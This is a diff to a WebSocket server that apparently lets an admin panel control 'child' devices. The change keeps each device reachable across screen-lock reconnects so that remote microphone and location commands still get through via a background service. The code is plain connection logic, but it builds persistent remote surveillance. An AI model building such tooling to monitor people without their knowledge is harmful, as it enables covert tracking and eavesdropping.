@@ -267,7 +267,7 @@ let idSeq = 0
 function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }
 
 function send(ws, msg) {
-  if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg))
+  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg))
 }
 
 function broadcastToAdmins(msg) {
@@ -330,15 +330,22 @@ wss.on('connection', (ws) => {
             }
           }
 
-          // Deduplicate non-bg: close old session with same name
-          for (const [oldId, oldMeta] of users) {
-            if (oldMeta.name === name && !oldMeta.isBg) {
-              users.delete(oldId)
-              byWs.delete(oldMeta.ws)
-              try { oldMeta.ws.close() } catch {}
-              broadcastToAdmins({ type: 'user_left', userId: oldId })
-              break
-            }
+          // Reconnect to existing session with same name — preserves userId so
+          // admin panel's targetUser.id stays valid across screen-lock reconnects
+          let reconnecting = null
+          for (const [, m] of users) {
+            if (m.name === name && !m.isBg) { reconnecting = m; break }
+          }
+
+          if (reconnecting) {
+            byWs.delete(reconnecting.ws)
+            try { reconnecting.ws.close() } catch {}
+            reconnecting.ws = ws
+            meta = reconnecting
+            byWs.set(ws, meta)
+            send(ws, { type: 'auth_ok', role: 'user', userId: reconnecting.userId, name, users: getUserList() })
+            // No user_left / user_joined — seamless reconnect, same userId
+            return
           }
 
           meta = { ws, role: 'user', userId, name, isBg: false }
@@ -440,9 +447,17 @@ wss.on('connection', (ws) => {
       const primary = [...users.values()].find(u => u.userId === meta.primaryId)
       if (primary) delete primary.bgWs
     } else {
-      users.delete(meta.userId)
-      broadcastToAdmins({ type: 'user_left', userId: meta.userId })
-      broadcastAll({ type: 'users_list', users: getUserList() })
+      // If bg service is still alive, keep child visible in admin list
+      // Commands route via bgWs (target.bgWs || target.ws), so admin can still
+      // send start_mic/start_location while primary WS reconnects after screen unlock
+      if (meta.bgWs && meta.bgWs.readyState === WebSocket.OPEN) {
+        // Primary WS dropped but bg service is running — child stays visible
+        // meta.ws is now closed; send() will skip it; bgWs takes all commands
+      } else {
+        users.delete(meta.userId)
+        broadcastToAdmins({ type: 'user_left', userId: meta.userId })
+        broadcastAll({ type: 'users_list', users: getUserList() })
+      }
     }
   })
 
